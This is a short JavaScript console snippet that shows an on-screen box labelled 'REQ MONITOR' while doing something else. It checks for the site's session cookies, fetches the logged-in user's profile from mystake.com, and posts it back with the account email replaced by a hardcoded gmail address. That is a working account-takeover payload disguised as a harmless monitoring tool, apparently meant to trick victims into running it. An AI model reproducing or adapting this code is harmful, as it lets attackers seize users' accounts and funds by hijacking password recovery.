(()=>{
if(window.__x){window.__x.remove();delete window.__x;return}
const ui=document.createElement('div');
ui.style.cssText="position:fixed;top:10px;left:10px;z-index:9999999;background:#111;color:#fff;padding:10px;border-radius:8px;font:12px monospace;border:1px solid #555;box-shadow:0 0 10px #000;max-width:300px";
ui.innerHTML='<b style="color:#38bdf8">REQ MONITOR</b><br><span id="st">Checking...</span>';
document.body.appendChild(ui);
window.__x=ui;
const st=ui.querySelector('#st');
const log=t=>{st.innerHTML=t;console.log(t)};
const sid=document.cookie.match(/SessionId=([^;]+)/)?.[1];
const app=document.cookie.match(/AppAuth=([^;]+)/)?.[1];
if(!sid||!app){log('❌ Missing Cookies!');return;}
log('✅ Cookies Found.<br>Fetching profile...');
fetch('https://mystake.com/api/profile/p/getProfile',{headers:{'content-type':'application/json'}}).then(r=>r.json()).then(d=>{
    log('✅ Profile Fetched.<br>Sending edit...');
    const b={firstName:d.FirstName,lastName:d.LastName,birthDate:d.BirthDate,mobileNumber:d.Mobile,country:d.CountryId,state:d.RegionState,city:d.City,address:d.Address,email:"donnet424@gmail.com",postalCode:d.PostalCode,pin:d.Pin,gender:d.Gender,mobileCode:d.MobileCode};
    return fetch('https://mystake.com/api/profile/editprofile',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b)});
}).then(r=>{log('📥 Status: '+r.status);return r.text();}).then(t=>log('✅ Done!')).catch(e=>log('❌ Error: '+e));
})();
